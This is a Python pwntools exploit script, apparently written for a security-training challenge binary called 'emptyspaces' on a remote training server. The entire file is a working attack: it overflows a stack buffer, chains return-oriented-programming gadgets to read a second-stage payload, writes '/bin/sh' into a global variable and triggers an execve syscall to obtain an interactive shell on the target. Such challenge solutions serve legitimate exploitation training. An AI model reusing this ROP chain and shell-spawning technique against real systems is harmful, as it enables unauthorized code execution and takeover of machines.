from pwn import *

if "REMOTE" not in args:

    # env = {"LD_PRELOAD": "./home/acidburn/ropasaurusrex/libc-2.27.so"}

    # ssh = ssh("acidburn", "127.0.0.1", password='acidburn', port=2222)
    r = process("emptyspaces")
    gdb.attach(r, """
        # b *0x0804841c
        # c
        """)

    input("wait")
else:
    r = remote("bin.training.jinblack.it", 4006)

input('Trigger again read with more space')

payload = b''

for _ in range(64):
    payload += b'A'

payload += 8 * b'A'
read = 0x4497b0
globalVariable = 0x6bb2e0
popRdiRet = 0x400696
popRdxPopRsiRet = 0x44bd59
popRaxRet = 0x4155a4
popRdxRet = 0x44bd36
syscallRet = 0x474dc5

payload += p64(popRdiRet)
payload += p64(0)

payload += p64(popRdxRet)
payload += p64(400)

payload += p64(read)

r.send(payload)

input('Write ropchain')

payload = b''

for _ in range(64):
    payload += b'B'

payload += 8 * b'B'

for _ in range(5):
    payload += 8 * b'B'

payload += p64(popRdiRet)
payload += p64(0)

payload += p64(popRdxPopRsiRet)
payload += p64(8)
payload += p64(globalVariable)

payload += p64(read)

payload += p64(popRdxPopRsiRet)
payload += p64(0)
payload += p64(0)

payload += p64(popRdiRet)
payload += p64(globalVariable)

payload += p64(popRaxRet)
payload += p64(0x3b)

payload += p64(syscallRet)

r.send(payload)

input('Write /bin/sh on global variable')
r.send(b"\x2f\x62\x69\x6e\x2f\x73\x68\x00")

input('Write /bin/sh on global variable')

r.interactive()
